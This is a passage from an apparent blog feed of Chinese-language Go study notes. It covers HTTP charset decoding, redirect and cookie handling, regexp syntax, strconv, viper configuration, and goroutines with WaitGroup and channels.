class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 自动获取编码<br>go get golang.org/x/net/html<br>// 转码<br>go get golang.org/x/text<br>go get golang.org/x/text/transform<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// charsetFromContentType 从 Content-Type 标头中解析字符集信息并返回对应的编码<br>func charsetFromContentType(contentType string) (encoding.Encoding, error) &#123;<br>// 使用 mime 包解析 Content-Type 标头，获取参数<br>_, params, err := mime.ParseMediaType(contentType)<br>if err != nil &#123;<br>// 如果解析失败，返回 nil 编码和错误信息<br>return nil, err<br>&#125;<br><br>// 查找字符集参数<br>charset, found := params[&quot;charset&quot;]<br>if !found &#123;<br>// 如果字符集参数不存在，返回 nil 编码和自定义错误信息<br>return nil, fmt.Errorf(&quot;charset not found in Content-Type&quot;)<br>&#125;<br><br>// 使用 htmlindex 包获取对应字符集的编码<br>return htmlindex.Get(charset)<br>&#125;<br><br>// transformEncoding 根据给定的编码，将读取器转换为相应编码的读取器<br>func transformEncoding(encoding encoding.Encoding, r io.Reader) io.Reader &#123;<br>if encoding == nil &#123;<br>// 如果编码为空（nil），返回原始读取器<br>return r<br>&#125;<br><br>// 使用编码的 NewDecoder 方法创建一个解码器<br>decoder := encoding.NewDecoder()<br><br>// 使用解码器将原始读取器包装，返回一个新的读取器<br>return decoder.Reader(r)<br>&#125;<br><br>func main() &#123;<br>// 定义目标 URL<br>url := &quot;http://mail.stu.hrbust.edu.cn/&quot;<br><br>// 发起 GET 请求<br>response, err := http.Get(url)<br>if err != nil &#123;<br>fmt.Printf(&quot;请求失败: %v\n&quot;, err)<br>return<br>&#125;<br>defer response.Body.Close()<br><br>// 获取响应的编码信息<br>contentType := response.Header.Get(&quot;Content-Type&quot;)<br>httpEncoding, _ := charsetFromContentType(contentType)<br><br>// 使用确定的编码重新读取响应内容<br>decodedBody := transformEncoding(httpEncoding, response.Body)<br><br>// 读取响应内容<br>body, err := io.ReadAll(decodedBody)<br>if err != nil &#123;<br>fmt.Printf(&quot;读取响应失败: %v\n&quot;, err)<br>return<br>&#125;<br><br>// 打印响应内容<br>fmt.Println(&quot;响应内容:&quot;)<br>fmt.Println(string(body))<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><h2 id="设置最大重定向次数"><a href="#设置最大重定向次数" class="headerlink" title="设置最大重定向次数"></a>设置最大重定向次数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func httpGetRedirect()&#123;<br>client := &amp;http.Client&#123;<br>CheckRedirect: func(req *http.Request, via []*http.Request) error &#123;<br>// 重定向次数超过10次报错<br>if len(via) &gt; 10&#123;<br>return errors.New(&quot;redirect  ------&gt;&quot;)<br>&#125;<br>return nil<br>&#125;,<br>&#125;<br>request,_ := http.NewRequest(http.MethodGet, &quot;https://httpbin.org/redirect/11&quot;, nil)<br>_,err := client.Do(request)<br>if err != nil&#123;panic(err)&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="禁止重定向"><a href="#禁止重定向" class="headerlink" title="禁止重定向"></a>禁止重定向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func httpGetRedirect()&#123;<br>client := &amp;http.Client&#123;<br>CheckRedirect: func(req *http.Request, via []*http.Request) error &#123;<br>return http.ErrUseLastResponse<br>&#125;,<br>&#125;<br>request,_ := http.NewRequest(http.MethodGet, &quot;https://httpbin.org/cookies/set?test=1&quot;, nil)<br><br>qqq,err := client.Do(request)<br>//qqq,_ := http.DefaultClient.Do(request)<br>if err != nil&#123;panic(err)&#125;<br>defer func() &#123;_ = qqq.Body.Close()&#125;()<br><br>fmt.Println(qqq.Request.URL)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func jarCookie()&#123;<br>jar,_ := cookiejar.New(nil)<br>client := &amp;http.Client&#123;<br>Jar: jar,<br>&#125;<br>r,_ := client.Get(&quot;https://httpbin.org/cookies/set?user=test&amp;pass=123&quot;)<br>defer func()&#123;_=r.Body.Close()&#125;()<br>_,_ = io.Copy(os.Stdout, r.Body)<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.bilibili.com/video/BV1NJ411r7vd?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1NJ411r7vd?spm_id_from=333.337.search-card.all.click</a></p><p><a href="https://www.topgoer.cn/docs/golang/golang-1ccjbpfstsfi1">https://www.topgoer.cn/docs/golang/golang-1ccjbpfstsfi1</a></p><p><a href="https://studygolang.com/pkgdoc">https://studygolang.com/pkgdoc</a></p><p><a href="https://www.freesion.com/article/1880168096/">https://www.freesion.com/article/1880168096/</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go regexp 库</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/regexp/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/regexp/</url>
      
        <content type="html"><![CDATA[<h1 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test = &quot;aac abc acc adc aec&quot;<br>// 匹配字符串<br>// 表达式<br>regexp.MustCompile(`&lt;匹配规则&gt;`)<br>regexp.MustCompile(`a.c`)<br>// 匹配正整数<br>regexp.Compile(``)<br>// 根据规则提取内容(以数组形式返回)<br>FindAllStringSubmatch(&lt;需要匹配的内容&gt;, &lt;匹配次数&gt;)<br>regexp.MustCompile(`a.c`).FindAllStringSubmatch(buf, -1)<br></code></pre></td></tr></table></figure><h1 id="正则表达式语法规则"><a href="#正则表达式语法规则" class="headerlink" title="正则表达式语法规则"></a>正则表达式语法规则</h1><h2 id="1、字符"><a href="#1、字符" class="headerlink" title="1、字符"></a>1、字符</h2><table><thead><tr><th>语法</th><th>说明</th><th>表达式示例</th><th>匹配结果</th></tr></thead><tbody><tr><td>一般字符</td><td>匹配自身</td><td>abc</td><td>abc</td></tr><tr><td>.</td><td>匹配任意除换行符”\n”外的字符， 在 DOTALL 模式中也能匹配换行符</td><td>a.c</td><td>abc</td></tr><tr><td>\</td><td>转义字符，使后一个字符改变原来的意思； 如果字符串中有字符 * 需要匹配，可以使用 * 或者字符集［*]。</td><td>a.c a\c</td><td>a.c a\c</td></tr><tr><td>[…]</td><td>字符集（字符类），对应的位置可以是字符集中任意字符。 字符集中的字符可以逐个列出，也可以给出范围，如 [abc] 或 [a-c]， 第一个字符如果是 ^ 则表示取反，如 [^abc] 表示除了abc之外的其他字符。</td><td>a[bcd]e</td><td>abe 或 ace 或 ade</td></tr><tr><td>\d</td><td>数字：[0-9]</td><td>a\dc</td><td>a1c</td></tr><tr><td>\D</td><td>非数字：[^\d]</td><td>a\Dc</td><td>abc</td></tr><tr><td>\s</td><td>空白字符：[&lt;空格&gt;\t\r\n\f\v]</td><td>a\sc</td><td>a c</td></tr><tr><td>\S</td><td>非空白字符：[^\s]</td><td>a\Sc</td><td>abc</td></tr><tr><td>\w</td><td>单词字符：[A-Za-z0-9]</td><td>a\wc</td><td>abc</td></tr><tr><td>\W</td><td>非单词字符：[^\w]</td><td>a\Wc</td><td>a c</td></tr></tbody></table><h2 id="2、数量词（用在字符或-…-之后）"><a href="#2、数量词（用在字符或-…-之后）" class="headerlink" title="2、数量词（用在字符或 (…) 之后）"></a>2、数量词（用在字符或 (…) 之后）</h2><table><thead><tr><th>语法</th><th>说明</th><th>表达式示例</th><th>匹配结果</th></tr></thead><tbody><tr><td>*</td><td>匹配前一个字符 0 或无限次</td><td>abc*</td><td>ab 或 abccc</td></tr><tr><td>+</td><td>匹配前一个字符 1 次或无限次</td><td>abc+</td><td>abc 或 abccc</td></tr><tr><td>?</td><td>匹配前一个字符 0 次或 1 次</td><td>abc?</td><td>ab 或 abc</td></tr><tr><td>{m}</td><td>匹配前一个字符 m 次</td><td>ab{2}c</td><td>abbc</td></tr><tr><td>{m,n}</td><td>匹配前一个字符 m 至 n 次，m 和 n 可以省略，若省略 m，则匹配 0 至 n 次； 若省略 n，则匹配 m 至无限次</td><td>ab{1,2}c</td><td>abc 或 abbc</td></tr></tbody></table><h2 id="3、边界匹配"><a href="#3、边界匹配" class="headerlink" title="3、边界匹配"></a>3、边界匹配</h2><table><thead><tr><th>语法</th><th>说明</th><th>表达式示例</th><th>匹配结果</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串开头，在多行模式中匹配每一行的开头</td><td>^abc</td><td>abc</td></tr><tr><td>$</td><td>匹配字符串末尾，在多行模式中匹配每一行的末尾</td><td>abc$</td><td>abc</td></tr><tr><td>\A</td><td>仅匹配字符串开头</td><td>\Aabc</td><td>abc</td></tr><tr><td>\Z</td><td>仅匹配字符串末尾</td><td>abc\Z</td><td>abc</td></tr><tr><td>\b</td><td>匹配 \w 和 \W 之间</td><td>a\b!bc</td><td>a!bc</td></tr><tr><td>\B</td><td>[^\b]</td><td>a\Bbc</td><td>abc</td></tr></tbody></table><h2 id="4、逻辑、分组"><a href="#4、逻辑、分组" class="headerlink" title="4、逻辑、分组"></a>4、逻辑、分组</h2><table><thead><tr><th>语法</th><th>说明</th><th>表达式示例</th><th>匹配结果</th></tr></thead><tbody><tr><td>|</td><td>| 代表左右表达式任意匹配一个，优先匹配左边的表达式</td><td>abc|def</td><td>abc 或 def</td></tr><tr><td>(…)</td><td>括起来的表达式将作为分组，分组将作为一个整体，可以后接数量词</td><td>(abc){2}</td><td>abcabc</td></tr><tr><td>(?P<name>…)</name></td><td>分组，功能与 (…) 相同，但会指定一个额外的别名</td><td>(?P<id>abc){2}</id></td><td>abcabc</td></tr><tr><td>&lt;number&gt;</td><td>引用编号为 <number> 的分组匹配到的字符串</number></td><td>(\d)abc\1</td><td>1abe1 或 5abc5</td></tr><tr><td>(?P&#x3D;name)</td><td>引用别名为 <name> 的分组匹配到的字符串</name></td><td>(?P<id>\d)abc(?P&#x3D;id)</id></td><td>1abe1 或 5abc5</td></tr></tbody></table><h2 id="5、特殊构造（不作为分组）"><a href="#5、特殊构造（不作为分组）" class="headerlink" title="5、特殊构造（不作为分组）"></a>5、特殊构造（不作为分组）</h2><table><thead><tr><th>语法</th><th>说明</th><th>表达式示例</th><th>匹配结果</th></tr></thead><tbody><tr><td>(?:…)</td><td>(…) 的不分组版本，用于使用 “|” 或后接数量词</td><td>(?:abc){2}</td><td>abcabc</td></tr><tr><td>(?iLmsux)</td><td>iLmsux 中的每个字符代表一种匹配模式，只能用在正则表达式的开头，可选多个</td><td>(?i)abc</td><td>AbC</td></tr><tr><td>(?#…)</td><td># 后的内容将作为注释被忽略。</td><td>abc(?#comment)123</td><td>abc123</td></tr><tr><td>(?&#x3D;…)</td><td>之后的字符串内容需要匹配表达式才能成功匹配</td><td>a(?&#x3D;\d)</td><td>后面是数字的 a</td></tr><tr><td>(?!…)</td><td>之后的字符串内容需要不匹配表达式才能成功匹配</td><td>a(?!\d)</td><td>后面不是数字的 a</td></tr><tr><td>(?&lt;&#x3D;…)</td><td>之前的字符串内容需要匹配表达式才能成功匹配</td><td>(?&lt;&#x3D;\d)a</td><td>前面是数字的a</td></tr><tr><td>(?&lt;!…)</td><td>之前的字符串内容需要不匹配表达式才能成功匹配</td><td>(?&lt;!\d)a</td><td>前面不是数字的a</td></tr></tbody></table><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://c.biancheng.net/view/5124.html">http://c.biancheng.net/view/5124.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go strconv</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/strconv/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/strconv/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><table><thead><tr><th>方法</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td><code>strconv.Itoa(i int)</code></td><td>将整数 <code>i</code> 转换为字符串。</td><td><code>str := strconv.Itoa(42)</code></td></tr><tr><td><code>strconv.FormatInt(i int64, base int)</code></td><td>将整数 <code>i</code> 转换为指定进制 <code>base</code> 的字符串。</td><td><code>str := strconv.FormatInt(42, 10)</code></td></tr><tr><td><code>strconv.Atoi(s string)</code></td><td>将字符串 <code>s</code> 转换为整数。</td><td><code>i, err := strconv.Atoi(&quot;42&quot;)</code></td></tr><tr><td><code>strconv.ParseInt(s string, base int, bitSize int)</code></td><td>将字符串 <code>s</code> 解析为整数，可以指定进制 <code>base</code> 和位大小 <code>bitSize</code>。</td><td><code>i, err := strconv.ParseInt(&quot;42&quot;, 10, 64)</code></td></tr><tr><td><code>strconv.FormatFloat(f float64, fmt byte, prec, bitSize int)</code></td><td>将浮点数 <code>f</code> 转换为字符串，可以指定格式 <code>fmt</code>、精度 <code>prec</code> 和位大小 <code>bitSize</code>。</td><td><code>str := strconv.FormatFloat(3.14, &#39;f&#39;, 2, 64)</code></td></tr><tr><td><code>strconv.ParseFloat(s string, bitSize int)</code></td><td>将字符串 <code>s</code> 解析为浮点数，可以指定位大小 <code>bitSize</code>。</td><td><code>f, err := strconv.ParseFloat(&quot;3.14&quot;, 64)</code></td></tr><tr><td><code>strconv.Quote(s string)</code></td><td>返回带有双引号的字符串 <code>s</code> 的表示形式，用于转义特殊字符。</td><td><code>quoted := strconv.Quote(&quot;Hello, \&quot;World\&quot;&quot;)</code></td></tr><tr><td><code>strconv.Unquote(s string)</code></td><td>移除字符串 <code>s</code> 的双引号并将其还原为原始字符串。</td><td><code>unquoted, err := strconv.Unquote(</code>“Hello, “World””<code>)</code></td></tr><tr><td><code>strconv.AppendInt(dst []byte, i int64, base int)</code></td><td>将整数 <code>i</code> 转换为指定进制 <code>base</code> 的字节切片 <code>dst</code>。</td><td><code>dst := strconv.AppendInt([]byte&#123;&#125;, 42, 10)</code></td></tr><tr><td><code>strconv.AppendFloat(dst []byte, f float64, fmt byte, prec, bitSize int)</code></td><td>将浮点数 <code>f</code> 转换为字节切片 <code>dst</code>，可以指定格式 <code>fmt</code>、精度 <code>prec</code> 和位大小 <code>bitSize</code>。</td><td><code>dst := strconv.AppendFloat([]byte&#123;&#125;, 3.14, &#39;f&#39;, 2, 64)</code></td></tr><tr><td><code>strconv.Itoa64(i int64)</code></td><td>已弃用。使用 <code>strconv.FormatInt(i, 10)</code> 代替。</td><td><code>str := strconv.FormatInt(42, 10)</code></td></tr><tr><td><code>strconv.ParseBool(str string)</code></td><td>将字符串 <code>str</code> 解析为布尔值（”true” 或 “false”），返回布尔值和解析错误。</td><td><code>b, err := strconv.ParseBool(&quot;true&quot;)</code></td></tr><tr><td><code>strconv.QuoteToASCII(s string)</code></td><td>返回带有双引号的字符串 <code>s</code> 的 ASCII 表示形式，用于包括非打印字符。</td><td><code>quoted := strconv.QuoteToASCII(&quot;Hello\nWorld&quot;)</code></td></tr></tbody></table><p>解码 <code>Unicode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">strconv.Unquote(strings.Replace(strconv.Quote(test), `\\u`, `\u`, -1))<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go viper</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/viper/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/viper/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">go get github.com/spf13/viper<br><br>import &quot;github.com/spf13/viper&quot;<br></code></pre></td></tr></table></figure><h1 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">viper.SetConfigName(&quot;config&quot;)// 配置文件的名称（没有扩展名）<br>viper.SetConfigType(&quot;yaml&quot;)// 文件类型<br>viper.AddConfigPath(&quot;/etc/appname/&quot;)// 查找配置文件的路径。<br>viper.AddConfigPath(&quot;$HOME/.appname&quot;)// 多次调用以添加许多搜索路径<br>viper.AddConfigPath(&quot;.&quot;)// 可选择在工作目录<br>err := viper.ReadInConfig()// 查找并读取配置文件，<br>if err != nil &#123;// 处理读取配置文件的错误<br>panic(fmt.Errorf(&quot;Fatal error config file: %s \n&quot;, err))<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h1><ul><li><code>Get(key string) : interface&#123;&#125;</code></li><li><code>GetBool(key string) : bool</code></li><li><code>GetFloat64(key string) : float64</code></li><li><code>GetInt(key string) : int</code></li><li><code>GetString(key string) : string</code></li><li><code>GetStringMap(key string) : map[string]interface&#123;&#125;</code></li><li><code>GetStringMapString(key string) : map[string]string</code></li><li><code>GetStringSlice(key string) : []string</code></li><li><code>GetTime(key string) : time.Time</code></li><li><code>GetDuration(key string) : time.Duration</code></li><li><code>IsSet(key string) : bool</code></li><li><code>AllSettings() : map[string]interface&#123;&#125;</code></li></ul><h1 id="读取yaml文件"><a href="#读取yaml文件" class="headerlink" title="读取yaml文件"></a>读取yaml文件</h1><p><strong>配置文件内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test:<br>  &quot;api&quot;: &quot;xxxxxxxxxxxxxx&quot;<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func test(targetInfo string) string&#123;<br>viper.SetConfigName(&quot;config&quot;)// 配置文件名<br>viper.SetConfigType(&quot;yaml&quot;)// 文件类型<br>viper.AddConfigPath(&quot;./&quot;)// 文件路径<br>err := viper.ReadInConfig()// 查找并读取配置文件<br>if err != nil&#123;panic(err)&#125;<br><br>configInfo := viper.GetString(targetInfo)// 读取 test 下的 api<br>all := viper.AllSettings()// 读取所有配置<br><br>fmt.Println(SendAPI)<br>fmt.Println(all)<br>return configInfo<br>&#125;<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func test(targetInfo string) string&#123;<br>vp := viper.New()// 创建实例<br>vp.SetConfigName(&quot;config&quot;)<br>vp.SetConfigType(&quot;yaml&quot;)<br>vp.AddConfigPath(&quot;./&quot;)<br>err := vp.ReadInConfig()<br>if err != nil&#123;panic(err)&#125;<br><br>configInfo := vp.GetString(targetInfo)<br>all := vp.AllSettings()<br><br>fmt.Println(SendAPI)<br>fmt.Println(all)<br>return configInfo<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 协程</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/%E5%A4%9A%E7%BA%BF%E7%A8%8B(%E5%8D%8F%E7%A8%8B)/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/%E5%A4%9A%E7%BA%BF%E7%A8%8B(%E5%8D%8F%E7%A8%8B)/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func a()&#123;<br>fmt.Println(&quot;a&quot;)<br>&#125;<br><br>func main()&#123;<br>go a()<br>time.Sleep(time.Second*2)<br>&#125;<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>for i:=1; i&lt;=5; i++&#123;<br>go func()&#123;<br>fmt.Println(&quot;q&quot;)<br>&#125;()<br>&#125;<br>time.Sleep(time.Second*2)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="创建和启动-Goroutines-WaitGroup"><a href="#创建和启动-Goroutines-WaitGroup" class="headerlink" title="创建和启动 Goroutines (WaitGroup)"></a>创建和启动 Goroutines (WaitGroup)</h1><table><thead><tr><th>属性&#x2F;方法</th><th>描述</th></tr></thead><tbody><tr><td>wg.Add(delta int)</td><td>增加等待组的计数器，表示有多少个任务需要等待完成。</td></tr><tr><td>wg.Done()</td><td>标记一个任务已完成，减少等待组的计数器。</td></tr><tr><td>wg.Wait()</td><td>阻塞当前goroutine，等待等待组的计数器降为零，所有任务都已完成。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;net/http&quot;<br>&quot;sync&quot;<br>)<br><br>// httpRequest 函数发送HTTP请求并输出响应状态码<br>func httpRequest(url string, wg *sync.WaitGroup) &#123;<br>resp, err := http.Get(url) // 发送HTTP GET请求<br>if err != nil &#123;<br>fmt.Println(&quot;Error:&quot;, err) // 打印错误信息（如果有）<br>&#125; else &#123;<br>fmt.Printf(&quot;Status Code for %s: %d\n&quot;, url, resp.StatusCode) // 打印响应状态码<br>resp.Body.Close() // 关闭响应体，释放资源<br>&#125;<br>wg.Done() // 通知等待组任务已完成<br>&#125;<br><br>func main() &#123;<br>url := &quot;http://127.0.0.1&quot; // 要访问的URL<br>numThreads := 100 // 线程数量<br><br>var wg sync.WaitGroup<br>wg.Add(numThreads) // 设置等待组计数，初始化为线程数量<br><br>// 启动100个线程，每个线程都调用httpRequest函数<br>for i := 0; i &lt; numThreads; i++ &#123;<br>go httpRequest(url, &amp;wg) // 启动goroutine，向等待组传递指针<br>&#125;<br><br>wg.Wait() // 等待所有线程完成<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="使用通道进行通信"><a href="#使用通道进行通信" class="headerlink" title="使用通道进行通信"></a>使用通道进行通信</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;io&quot;<br>&quot;net/http&quot;<br>)<br><br>func httpRequest(url string, ch chan int) &#123;<br>resp, err := http.Get(url)<br>if err != nil &#123;<br>fmt.Println(&quot;Error:&quot;, err)<br>ch &lt;- -1 // 发送错误代码到通道<br>return<br>&#125;<br>defer func(Body io.ReadCloser) &#123;<br>_ = Body.Close()<br>&#125;(resp.Body)<br><br>ch &lt;- resp.StatusCode // 发送响应状态码到通道<br>&#125;<br><br>func main() &#123;<br>url := &quot;http://127.0.0.1&quot;<br>numRequests := 5 // 要发送的请求数量<br><br>// 创建一个通道用于接收响应状态码<br>ch := make(chan int, numRequests)<br><br>// 启动多个 goroutines 发送 HTTP 请求<br>for i := 0; i &lt; numRequests; i++ &#123;<br>go httpRequest(url, ch)<br>&#125;<br><br>// 从通道接收响应状态码<br>for i := 0; i &lt; numRequests; i++ &#123;<br>statusCode := &lt;-ch<br>if statusCode == -1 &#123;<br>fmt.Println(&quot;Failed to retrieve the status code.&quot;)<br>&#125; else &#123;<br>fmt.Printf(&quot;Status Code: 